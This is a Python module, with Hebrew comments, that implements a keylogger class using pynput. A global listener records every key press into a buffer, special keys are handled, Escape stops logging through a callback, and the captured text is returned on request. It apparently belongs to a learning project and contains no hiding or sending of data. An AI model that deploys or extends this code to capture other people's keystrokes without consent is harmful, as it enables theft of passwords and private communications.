from pynput import keyboard
from Ikeyloger import IKeyLogger



class KeyLoggerService(IKeyLogger):

    def __init__(self,on_escape_callback=None):
        self.buffer: list[str] = []
        self._listener = None
        self.on_escape_callback = on_escape_callback


    def on_press(self,key):
        try:
            # מקש רגיל (אות/מספר)
            self.buffer.append(key.char)
        except AttributeError:
            # מקשים מיוחדים
            if key == keyboard.Key.enter:
                self.buffer.append('\n')
            elif key == keyboard.Key.space:
                self.buffer.append(' ')
            elif key == keyboard.Key.tab:
                self.buffer.append('\t')
            # elif key == keyboard.Key.backspace:
            #     if self.buffer:
            #         self.buffer.pop()  # מחיקה מה-buffer
            # elif key == keyboard.Key.delete:
            #     # אפשר לשים סימן שמייצג delete או לטפל אחרת
            #     self.buffer.append('[DEL]')
            # elif key == keyboard.Key.up:
            #     self.buffer.append('[UP]')
            # elif key == keyboard.Key.down:
            #     self.buffer.append('[DOWN]')
            # elif key == keyboard.Key.left:
            #     self.buffer.append('[LEFT]')
            # elif key == keyboard.Key.right:
            #     self.buffer.append('[RIGHT]')
            # elif key == keyboard.Key.home:
            #     self.buffer.append('[HOME]')
            # elif key == keyboard.Key.end:
            #     self.buffer.append('[END]')
            # elif key == keyboard.Key.page_up:
            #     self.buffer.append('[PAGE_UP]')
            # elif key == keyboard.Key.page_down:
            #     self.buffer.append('[PAGE_DOWN]')
            # elif key == keyboard.Key.insert:
            #     self.buffer.append('[INSERT]')
            # elif key == keyboard.Key.caps_lock:
            #     self.buffer.append('[CAPS_LOCK]')
            # elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            #     self.buffer.append('[SHIFT]')
            # elif key == keyboard.Key.ctrl or key == keyboard.Key.ctrl_r:
            #     self.buffer.append('[CTRL]')
            # elif key == keyboard.Key.alt or key == keyboard.Key.alt_r:
            #     self.buffer.append('[ALT]')
            #
            # elif key in (keyboard.Key.cmd, keyboard.Key.cmd_r):
            #     self.buffer.append('[CMD]')
            elif key == keyboard.Key.esc:  # עצירה בלחיצה על ESC
                if self.on_escape_callback:
                    self.on_escape_callback()

            else:
                # כל מקש אחר שלא זוהה
                self.buffer.append(f'[{str(key)}]')


    def start_logging(self) -> None:
            # יצירת מאזין
      if not self._listener:
        self._listener = keyboard.Listener(on_press=self.on_press)
        self._listener.start()

    def stop_logging(self) -> None:
        if self._listener:
                self._listener.stop()
                self._listener=None

    def get_logged_keys(self) -> str:
        temp= "".join(self.buffer)
        self.buffer= []
        return  temp
